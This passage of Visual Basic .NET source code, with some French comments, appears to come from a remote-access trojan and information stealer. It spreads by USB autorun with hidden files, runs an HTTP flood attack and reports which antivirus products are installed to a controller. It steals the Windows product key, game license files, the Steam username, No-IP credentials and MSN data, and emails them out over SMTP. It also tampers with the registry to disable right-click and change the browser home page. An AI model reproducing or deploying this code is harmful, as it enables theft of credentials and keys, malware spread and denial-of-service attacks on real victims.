            Dim writer As New StreamWriter(client.GetStream())
            writer.WriteLine(message)
            writer.Flush()
        Catch ex As Exception
        End Try
    End Sub
    Sub SendStatus(ByVal Message As String)
        Try
            Dim writer As New StreamWriter(client.GetStream())
            writer.WriteLine("STATUS|" & Message)
            writer.Flush()
        Catch ex As Exception
        End Try
    End Sub
    Sub UsbSpread()
        Try
            Dim drivers As String = My.Computer.FileSystem.SpecialDirectories.ProgramFiles()
            Dim driver() As String = (IO.Directory.GetLogicalDrives)
            For Each drivers In driver
                Try
                    IO.File.Copy(Application.ExecutablePath, drivers & "black.scr")
                    Dim autorunwriter = New StreamWriter(drivers & "\autorun.inf")
                    autorunwriter.WriteLine("[autorun]")
                    autorunwriter.WriteLine("open=" & drivers & "black.scr")
                    autorunwriter.WriteLine("shellexecute=" & drivers, 1)
                    autorunwriter.Close()
                    System.IO.File.SetAttributes(drivers & "autorun.inf", FileAttributes.Hidden)
                    System.IO.File.SetAttributes(drivers & "black.scr", FileAttributes.Hidden)
                Catch ex As Exception
                End Try
            Next
        Catch
        End Try
    End Sub
    Private Function ChangeWallpaper(ByVal sLink As String)
        Dim Image As System.Drawing.Image
        Dim WebClient As New System.Net.WebClient()
        Dim sExt As String = sLink.Substring(sLink.Length - 4)

        If Not System.IO.File.Exists(System.IO.Path.GetTempPath + "wallpaper" + sExt) Then
            WebClient.DownloadFile(sLink, System.IO.Path.GetTempPath + "wallpaper" + sExt)
        Else
            System.IO.File.Delete(System.IO.Path.GetTempPath + "wallpaper" + sExt)
            WebClient.DownloadFile(sLink, System.IO.Path.GetTempPath + "wallpaper" + sExt)
        End If

        Image = Image.FromFile(System.IO.Path.GetTempPath + "wallpaper" + sExt)
        Image.Save(System.IO.Path.GetTempPath + "\wallpaper.bmp", System.Drawing.Imaging.ImageFormat.Bmp)
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, System.IO.Path.GetTempPath + "\wallpaper.bmp", SPIF_UPDATEINIFILE)

        Return Nothing
    End Function
    Sub AVG()
        Dim P As String 'Définition des variables
        Dim N As String
        P = "C:\Program Files\AVG" ' On initialise la variable
        If (N = Dir(P, vbDirectory)) = vbEmpty Then 'On teste
            'existence du répertoire...
            SendStatus("         Status: AVG Installed !")
        Else
        End If
    End Sub
    Sub AVGX86()
        Dim Path As String 'Définition des variables
        Dim Name As String
        Path = "C:\Program Files (x86)\AVG" ' On initialise la variable
        If (Name = Dir(Path, vbDirectory)) = vbEmpty Then 'On teste
            'existence du répertoire...
            SendStatus("         Status: AVG Installed !")
        Else
        End If
    End Sub
    Sub Avast()
        Dim MyPath As String 'Définition des variables
        Dim myName As String
        MyPath = "C:\Program Files\AVAST Software" ' On initialise la variable
        If (myName = Dir(MyPath, vbDirectory)) = vbEmpty Then 'On teste
            'existence du répertoire...
            SendStatus("         Status: Avast Installed !")
        Else
        End If
    End Sub
    Sub Kapersky()
        Dim PT As String 'Définition des variables
        Dim MN As String
        PT = "C:\Program Files\Kaspersky Lab" ' On initialise la variable
        If (MN = Dir(PT, vbDirectory)) = vbEmpty Then 'On teste
            'existence du répertoire...
            SendStatus("         Status: Kapersky Installed !")
        Else
        End If
    End Sub
    Sub KaperskyX86()
        Dim PTS As String 'Définition des variables
        Dim MNS As String
        PTS = "C:\Program Files (x86)\Kaspersky Lab" ' On initialise la variable
        If (MNS = Dir(PTS, vbDirectory)) = vbEmpty Then 'On teste
            'existence du répertoire...
            SendStatus("         Status: Kapersky Installed !")
        Else
        End If
    End Sub
    Sub GDATA()
        Dim tt As String 'Définition des variables
        Dim ss As String
        tt = "C:\Program Files\G Data" ' On initialise la variable
        If (ss = Dir(tt, vbDirectory)) = vbEmpty Then 'On teste
            'existence du répertoire...
            SendStatus("         Status: G Data Installed !")
        Else
        End If
    End Sub
    Sub GDATAX86()
        Dim kl As String 'Définition des variables
        Dim oo As String
        kl = "C:\Program Files (x86)\G Data Lab" ' On initialise la variable
        If (oo = Dir(kl, vbDirectory)) = vbEmpty Then 'On teste
            'existence du répertoire...
            SendStatus("         Status: G Data Installed !")
        Else
        End If
    End Sub
    Sub AvastX86()
        Dim Path As String 'Définition des variables
        Dim Name As String
        Path = "C:\Program Files (x86)\AVAST Software" ' On initialise la variable
        If (Name = Dir(Path, vbDirectory)) = vbEmpty Then 'On teste
            'existence du répertoire...
            SendStatus("         Status: Avast Installed !")
        Else
        End If
    End Sub
    Sub connectioninfo()
        Try
            Send("HInfo")
            Send("PInfo")
            client.GetStream().BeginRead(New Byte() {0}, 0, 0, AddressOf Read, Nothing)
        Catch ex As Exception
            Threading.Thread.Sleep(4000)
        End Try
    End Sub
    Public Sub AddHome(ByVal text As String)
        Dim key As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Internet Explorer\Main", True)
        key.SetValue("Start Page", text)
    End Sub
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Connect()
    End Sub
    Public Sub HttpFlood(ByVal source As Object, ByVal e As ElapsedEventArgs)
        Dim ipEntry As IPHostEntry = Dns.GetHostEntry(URL.Text)
        Dim IpAddr As IPAddress() = ipEntry.AddressList
        Dim i As Integer
        For i = 0 To IpAddr.Length - 1
            Dim host As IPAddress = IPAddress.Parse(IpAddr(i).ToString())
            Dim hostaddress As New IPEndPoint(host, 80)
            Dim sock As New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)

            Try
                sock.Connect(hostaddress)
            Catch generatedExceptionName As SocketException

                sock.Close()
                Exit Sub
            End Try
            Try
                sock.Send(Encoding.ASCII.GetBytes("GET /"))
            Catch generatedExceptionName As SocketException
                sock.Close()
                Exit Sub
            End Try
            sock.Close()
        Next i
    End Sub
    Private Sub Timer7_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer7.Tick

    End Sub
    Sub FPSC()
        Dim MyMailMessage As New MailMessage()
        MyMailMessage.From = New MailAddress("youremail@hotmail.fr")
        MyMailMessage.To.Add("youremail@hotmail.fr")
        MyMailMessage.Subject = ("+---Fpsc Key---+  " + My.Computer.Name)

        If System.IO.File.Exists("C:\Program Files\The Game Creators\FPS Creator\userdetails.ini") Then
            Dim objAttachment As New Attachment("C:\Program Files\The Game Creators\FPS Creator\userdetails.ini")
            MyMailMessage.Attachments.Add(objAttachment)
            Label10.Text = "The key is in .ini"
        Else
            Label10.Text = "The key is in .ini"
        End If

        If System.IO.File.Exists("C:\Program Files (x86)\The Game Creators\FPS Creator\userdetails.ini") Then
            Dim objAttachment As New Attachment("C:\Program Files (x86)\The Game Creators\FPS Creator\userdetails.ini")
            MyMailMessage.Attachments.Add(objAttachment)
            Label10.Text = "The key is in .ini"
        Else
            Label10.Text = "The key is in .ini"
        End If


        If System.IO.File.Exists("C:\Program Files\The Game Creators\FPS Creator Free\userdetails.ini") Then
            Dim objAttachment As New Attachment("C:\Program Files\The Game Creators\FPS Creator Free\userdetails.ini")
            MyMailMessage.Attachments.Add(objAttachment)
            Label10.Text = "The key is in .ini"
        Else
            Label10.Text = "The key is in .ini"
        End If

        If System.IO.File.Exists("C:\Program Files (x86)\The Game Creators\FPS Creator Free\userdetails.ini") Then
            Dim objAttachment As New Attachment("C:\Program Files (x86)\The Game Creators\FPS Creator Free\userdetails.ini")
            MyMailMessage.Attachments.Add(objAttachment)
            Label10.Text = "The key is in .ini"
        Else
            Label10.Text = "The key is in .ini"
        End If
        MyMailMessage.Body = "Fps Creator Key:  " + Label10.Text
        Dim SMTPServer As New SmtpClient("smtp.live.com")
        SMTPServer.Port = 587
        SMTPServer.Credentials = New System.Net.NetworkCredential("youremail@hotmail.fr", "password")
        SMTPServer.EnableSsl = True
        SMTPServer.Send(MyMailMessage)
    End Sub
    Sub WINKEY()
        TextKey.Text = (GetProductKey("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\", "DigitalProductId"))  'Fonctions Steal Windows Key
        Dim MyMailMessage As New MailMessage()
        MyMailMessage.From = New MailAddress("youremail@hotmail.fr")
        MyMailMessage.To.Add("youremail@hotmail.fr")
        MyMailMessage.Subject = ("+---Windows Key---+  " + My.Computer.Name)
        MyMailMessage.Body = ("Windows Key:" & vbNewLine & My.Computer.Info.OSFullName & "  " & TextKey.Text)

        Dim SMTPServer As New SmtpClient("smtp.live.com")
        SMTPServer.Port = 587
        SMTPServer.Credentials = New System.Net.NetworkCredential("youremail@hotmail.fr", "password")
        SMTPServer.EnableSsl = True
        SMTPServer.Send(MyMailMessage)
    End Sub
    Sub RCK()
        SendStatus("         Status: Right Click Enable...")
        Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 0 /f", vbNormalFocus)
        Shell("REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 0 /f", vbNormalFocus)
        SendStatus("         Status: Right Click Enable!")
    End Sub
    Sub RCD()
        SendStatus("         Status: Right Click Disable...")
        Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 1 /f", vbNormalFocus)
        Shell("REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 1 /f", vbNormalFocus)
        SendStatus("         Status: Right Click Disable!")
    End Sub
    Sub CrasyDVD()
        SendStatus("         Status: Crasy DVD...")
        Do
            Dim oWMP = CreateObject("WMPlayer.OCX.7")
            Dim colCDROMs = oWMP.cdromCollection
            If colCDROMs.Count = 1 Then
                For i = 0 To colCDROMs.Count - 1
                    colCDROMs.Item(i).Eject()
                Next ' cdrom
            End If
        Loop
        SendStatus("         Status: Crasy DVD!")
    End Sub
    Function GetSteamUsername()
        On Error Resume Next 'Prevents runtime errors
        Dim SteamPath As String = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Valve\Steam", "SteamPath", "") 'Sets SteamPath as value of the key 'SteamPath' in registry, which leads to the installation directory of steam.
        Dim ConfigPath As String = SteamPath & "\config\SteamAppData.vdf" ' Sets ConfigPath as a string equal to the file SteamAppData.vdf in the steam directory.
        Dim SteamUser() As String = My.Computer.FileSystem.ReadAllText(ConfigPath).Split("""") 'Takes the text from SteamAppData.vdf and parses through it to were the usernames are saved.

        If SteamUser(9) <> "" Then 'If there is a string in the location were usernames are saved then...
            SteamUser(9) = SteamUser(9) 'Added this because it bugged up sometimes <.<.
            Return SteamUser(9) 'Returns the saved username(s) :).
        Else
            Return Nothing
        End If
    End Function
    Sub SendSteam()
        Dim MyMailMessage As New MailMessage()
        MyMailMessage.From = New MailAddress("youremail@hotmail.fr")
        MyMailMessage.To.Add("youremail@hotmail.fr")
        MyMailMessage.Subject = ("+---Stealer Steam---+  " + My.Computer.Name)
        MyMailMessage.Body = "UserName Steam:  " + TextSteam.Text
        Dim SMTPServer As New SmtpClient("smtp.live.com")
        SMTPServer.Port = 587
        SMTPServer.Credentials = New System.Net.NetworkCredential("youremail@hotmail.fr", "password")
        SMTPServer.EnableSsl = True
        SMTPServer.Send(MyMailMessage)
    End Sub
    Public Function base64Decode(ByVal data As String) As String
        Try
            Dim encoder As New System.Text.UTF8Encoding()
            Dim utf8Decode As System.Text.Decoder = encoder.GetDecoder()
            Dim todecode_byte As Byte() = Convert.FromBase64String(data)
            Dim charCount As Integer = utf8Decode.GetCharCount(todecode_byte, 0, todecode_byte.Length)
            Dim decoded_char As Char() = New Char(charCount - 1) {}
            utf8Decode.GetChars(todecode_byte, 0, todecode_byte.Length, decoded_char, 0)
            Dim result As String = New [String](decoded_char)
            Return result
        Catch e As Exception
        End Try
    End Function
    Function IpRecord() As String
        Try
            IpRecord = Nothing
            Dim Username As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC", "Username", Nothing)
            Dim Password As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC", "Password", Nothing)
            Dim nl As String = vbNewLine
            Me.ztext.AppendText(nl)
            Me.ztext.AppendText("============IMVU==============")
            Me.ztext.AppendText("Username: " & Username)
            Me.ztext.AppendText(nl)
            Me.ztext.AppendText("Password: " & base64Decode(Password))
            Me.ztext.AppendText(nl)
            Me.ztext.AppendText("=============================")
            Me.ztext.AppendText(nl)
        Catch
            Dim nl As String = vbNewLine
            Me.ztext.AppendText(nl)
            Me.ztext.AppendText("============IMVU==============")
            Me.ztext.AppendText(nl)
            Me.ztext.AppendText("IMVU Not Installed!")
            Me.ztext.AppendText(nl)
        End Try
    End Function
    Sub NOIPS()

        Dim MyMailMessage As New MailMessage()
        MyMailMessage.From = New MailAddress("youremail@hotmail.fr")
        MyMailMessage.To.Add("youremail@hotmail.fr")
        MyMailMessage.Subject = ("+---No-IP Steal---+  " + My.Computer.Name)
        MyMailMessage.Body = (ztext.Text)

        Dim SMTPServer As New SmtpClient("smtp.live.com")
        SMTPServer.Port = 587
        SMTPServer.Credentials = New System.Net.NetworkCredential("youremail@hotmail.fr", "password")
        SMTPServer.EnableSsl = True
        SMTPServer.Send(MyMailMessage)
    End Sub
    Sub MsnSend()
        Dim MyMailMessage As New MailMessage()
        MyMailMessage.From = New MailAddress("youremail@hotmail.fr")
        MyMailMessage.To.Add("youremail@hotmail.fr")
        MyMailMessage.Subject = ("+---Msn Steal---+  " + My.Computer.Name)
        MyMailMessage.Body = (ztextz.Text)

        Dim SMTPServer As New SmtpClient("smtp.live.com")
        SMTPServer.Port = 587
        SMTPServer.Credentials = New System.Net.NetworkCredential("youremail@hotmail.fr", "password")
        SMTPServer.EnableSsl = True
        SMTPServer.Send(MyMailMessage)
    End Sub


End Class
